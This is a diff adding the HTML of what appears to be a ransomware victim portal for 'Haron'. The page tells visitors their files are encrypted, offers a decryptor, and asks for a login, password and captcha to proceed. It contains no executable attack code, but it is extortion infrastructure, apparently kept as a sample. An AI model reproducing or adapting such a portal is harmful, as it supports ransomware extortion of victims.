@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html class="h-100" lang="en">
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+        <meta charset="utf-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no" />
+        <meta name="csrf-token" content="kYCIfgTCt5ayNdXo8obuGEP7p5UKSNPBG8IdiWJa" />
+        <title>Clients page</title>
+        <link href="files/loader.css" rel="stylesheet" type="text/css" />
+        <script>
+            window.addEventListener("load", function () {
+                var load_screen = document.getElementById("load_screen");
+                setTimeout(() => {
+                    document.body.removeChild(load_screen);
+                }, 1000);
+            });
+        </script>
+        <link href="files/app.css" rel="stylesheet" type="text/css" />
+    </head>
+    <body class="h-100">
+        <div class="container h-100 d-flex align-items-center">
+            <div class="w-100">
+                <div class="d-flex justify-content-center mb-5">
+                    <img src="imgs/Screenshot_1-removebg-preview.png" alt="Brand" />
+                </div>
+                <h6 class="mb-5 font-weight-bold">
+                    Your network has been infected by Haron! All your documents, photos, databases and other important files have been encrypted. But don't worry, we can help you to restore all your files! To make sure, you can test our decryptor. You will get more information if you enter your login and password in the field below.                </h6>
+                                
+                <form method="post">
+                    <input type="hidden" name="_token" value="kYCIfgTCt5ayNdXo8obuGEP7p5UKSNPBG8IdiWJa" />
+                    <div class="form-group">
+                        <input type="text" name="login" placeholder="Enter your login" class="form-control" />
+                        <br />
+                        <input type="password" name="pass" placeholder="Enter your password" class="form-control" />
+                        <br />
+                        <input type="text" name="cap" placeholder="What's the captcha?" class="form-control" />
+                        <br />
+                        <div class="image" style="margin-left:px;margin-top:px;"><img src="jcaptcha.php" style="width: 120; height: 32; border: 0;" alt=" "></div>
+                    </div>
+                    <button type="submit" class="btn btn-primary btn-block">Enter</button>
+                </form>
+            </div>
+        </div>
+        <script src="files/app.js"></script>
+    </body>
+</html>
